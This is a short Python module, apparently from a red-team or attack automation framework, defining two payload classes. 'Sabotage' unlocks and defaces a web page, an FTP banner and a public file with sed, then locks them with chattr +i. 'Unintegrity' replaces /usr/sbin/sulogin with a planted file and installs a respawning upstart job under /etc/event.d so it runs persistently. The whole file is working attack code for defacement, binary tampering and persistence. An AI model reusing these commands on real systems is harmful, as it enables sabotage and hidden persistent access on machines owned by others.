#!/usr/bin/python3

from ..base import Payload

class Sabotage(Payload):

    targets = {"/srv/www/htdocs/index.html": 's/service\./service. /g',
               "/var/ftp/welcome.msg": 's/,//g',
               "/home/public/file": 's/ts/t/g'}

    def __init__(self):
        self.commands = []
        for i in self.targets:
            self.commands.append("chattr -i %s" % i)
            self.commands.append("sed -i '%s' %s" % (self.targets[i], i))
            self.commands.append("chmod -w %s" % i)
            self.commands.append("chattr +i %s" % i)

        self.commands.append("chattr -i /home/public/file")
        self.commands.append("chmod -w /home/public/file")
        self.commands.append("chattr +i /home/public/file")

    def steps(self):
        return self.commands

class Unintegrity(Payload):

    files = {"unintegrity": "/usr/sbin/sulogin"}

    def __init__(self):
        self.commands = []
        self.commands.append("chattr -i /usr/sbin/sulogin")
        self.commands.append("chmod +x /usr/sbin/sulogin")
        self.commands.append("chattr +i /usr/sbin/sulogin")
        self.commands.append('printf "start on runlevel 3\\n\\nexec /usr/sbin/'
                             'sulogin\\nrespawn\\n" > /etc/event.d/sulogin')
        self.commands.append('chmod +x /etc/event.d/sulogin')
        self.commands.append('chattr +i /usr/sbin/sulogin')
        self.commands.append('initctl start sulogin')

    def steps(self):
        return self.commands


